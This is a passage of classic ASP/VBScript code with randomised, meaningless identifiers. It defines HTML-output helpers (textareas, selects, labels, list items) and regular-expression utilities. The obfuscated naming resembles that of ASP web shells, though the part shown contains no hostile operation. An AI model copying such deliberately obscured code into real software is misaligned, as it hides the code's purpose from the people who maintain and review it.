If IsObject(str)Or IsNull(str)Or str="" Then str="<font color=red>Null</font>"
echo"<td nowrap>"&str&"</td>"
End Sub
Sub eks(name,value,width,rows,kqll)
echo"<textarea name='"&name&"' id='"&name&"' style='width:"&width&";' rows='"&rows&"' class='text' "&kqll&">"
echo jee(value)
mwt"</textarea>"
End Sub
Sub yhigl()
echo"<ul class='info'/>"
End Sub
Sub rycpp(name,width,kqll)
mwt"<select style='width:"&width&"' name='"&name&"' "&kqll&">"
End Sub
Sub ild()
mwt"</select>"
End Sub
Sub exhpr(value,str)
mwt"<option value='"&value&"'>"&str&"</option>"
End Sub
Sub nrf()
ads=ads+1
If ads>=2 Then ads=0
End Sub
Sub cppp(str)
mwt"<label>"&str&"</label>"
End Sub
Sub yln(str)
mkew=mkew&"<li>"&str&"</li>"
End Sub
Sub ome(Err)
If Err Then
tvnm(Err)
viwe
End If
End Sub
Function vsb(str,mvw)
wbxx.Pattern=mvw
vsb=wbxx.Test(str)
End Function
Function soa(str,mvw,zwdkp)
If zwdkp Then mvw=pxnsn(mvw)
wbxx.Pattern=mvw
Set soa=wbxx.Execute(str)
End Function
Function swye(str,mvw,dtw,zwdkp)
If zwdkp Then mvw=pxnsn(mvw)
wbxx.Pattern=mvw
swye=wbxx.Replace(str,dtw)
End Function
Function pxnsn(str)
str=Replace(str,"\","\\")
str=Replace(str,".","\.")
str=Replace(str,"?","\?")
str=Replace(str,"+","\+")
str=Replace(str,"(","\(")
str=Replace(str,")","\)")
str=Replace(str,"*","\*")
str=Replace(str,"[","\[")
str=Replace(str,"]","\]")
pxnsn=str
End Function
%>
